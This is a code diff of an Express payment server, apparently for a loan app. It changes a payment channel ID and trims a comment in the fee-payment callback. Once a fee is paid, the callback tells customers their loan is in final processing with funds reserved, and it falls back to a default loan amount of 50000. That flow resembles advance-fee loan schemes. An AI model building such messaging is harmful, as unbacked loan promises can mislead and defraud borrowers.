@@ -60,7 +60,7 @@ app.post("/pay", async (req, res) => {
       external_reference: reference,
       customer_name: "Customer",
       callback_url: "https://swiftloan-back.onrender.com/callback",
-      channel_id: "000354"
+      channel_id: 354
     };
 
     const url = "https://swiftwallet.co.ke/pay-app-v2/payments.php";
@@ -188,7 +188,7 @@ app.post("/callback", (req, res) => {
     loan_amount: existingReceipt.loan_amount || "50000",
     phone: data.result?.Phone || existingReceipt.phone,
     customer_name: customerName,
-    status: "processing",   // ✅ money confirmed, loan processing
+    status: "processing",
     status_note: `✅ Your fee payment has been received and verified.  
 Loan Reference: ${ref}.  
 Your loan is now in the final processing stage and funds are reserved for disbursement.  
